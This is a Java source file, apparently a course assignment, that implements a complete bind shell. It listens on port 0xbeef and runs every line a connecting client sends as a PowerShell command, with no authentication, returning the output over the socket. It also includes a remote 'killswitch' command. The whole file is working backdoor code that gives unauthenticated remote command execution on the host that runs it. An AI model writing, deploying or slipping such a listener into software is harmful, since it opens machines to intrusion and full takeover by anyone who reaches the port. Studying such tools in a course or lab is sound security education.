package unit10.assignment2.bindshell;



import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.HashSet;
import java.util.Scanner;
import java.net.ServerSocket;

public class ShellServer extends Thread {
    
    final static int shellport = 0xbeef;
    static HashSet<Thread> allthreads = new HashSet<>();
    static boolean deadthread = false;

    public class Handler extends Thread{
        private Socket client;
        Scanner fc; //from client
        PrintWriter toC = null; //to client

        public Handler(Socket sock) throws IOException {
            this.client = sock;
            fc = new Scanner(client.getInputStream());
            toC = new PrintWriter(client.getOutputStream());
        }

        @Override
        public void run(){
            try{
                toC.println("Welcome to BindShell v1.0 - please type responsibly.");
                toC.flush();
                this.mainLogic();

            } catch(IOException e){
                System.out.println("Clienthandler crashed for - "+client.getRemoteSocketAddress().toString());
            } 
        }

        protected void mainLogic() throws IOException{
            Scanner fp = null;
            String commCl = "";
            String command = "";// "powershell.exe -Command \"& ping.exe amazon.com > newfile.txt\" ";
            try {
                while(!deadthread){
                    commCl = fc.nextLine().strip(); // read a command line from client
                    System.out.println("Running " + commCl + " from client " + client.getInetAddress().getHostName());
                    if (!commCl.equals("bye") && !commCl.equals("killswitch")) {
                        command = "powershell.exe -Command \"& {" + commCl + "} \" ";
                        Process process = Runtime.getRuntime().exec(command);// launch process
                        fp = new Scanner(process.getInputStream());// communicate with process
                        String line = "";
                        while (fp.hasNext()) {
                            line = fp.nextLine();
                            toC.println(line); //send to client as ouput is received
                            toC.flush(); //never forget
                            System.out.println(line); //possibly disable this for multi threading
                        }
                        toC.println("endcom");
                        toC.flush(); //always
                    }
                    else{
                        break;
                    }
                }
                if (commCl.equals("killswitch")){
                    allthreads.remove(this);                    
                    deadthread = true;
                        // .stop() is deprecated;
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            System.out.println("Goodbye..");
            System.exit(1);
        }

    }

    
    /**
     * server main thread, instead of main(), to allow termination
     */
    @Override
    public void run() {
        ServerSocket server = null;
        Socket client = null;
        // Scanner fc; //from client
        // Scanner fp; //from process
        // PrintWriter toC = null; //to client
        
        try{
            server = new ServerSocket(ShellServer.shellport);
            System.out.println("[+]Listening on: "+server.getLocalSocketAddress());
            allthreads.add(this); //server main thread adds itself to allow abrupt remote killswitch termination
            while(!deadthread){
                client = server.accept();
                System.out.println("[+]Connection from: "+client.getPort()+":"+client.getInetAddress().getCanonicalHostName());
                Handler h = new Handler(client);
                allthreads.add(h);
                h.start();
            }
            

        } catch(IOException e){
            System.out.println("Server crashed in main loop.." + e.toString());
            
        } finally{
            try{
                server.close();                
                //crash and burn
            } catch(Exception e){}
            
        }

       

    }

    public static void main(String[] args) {
        new ShellServer().start();
    }
    
}
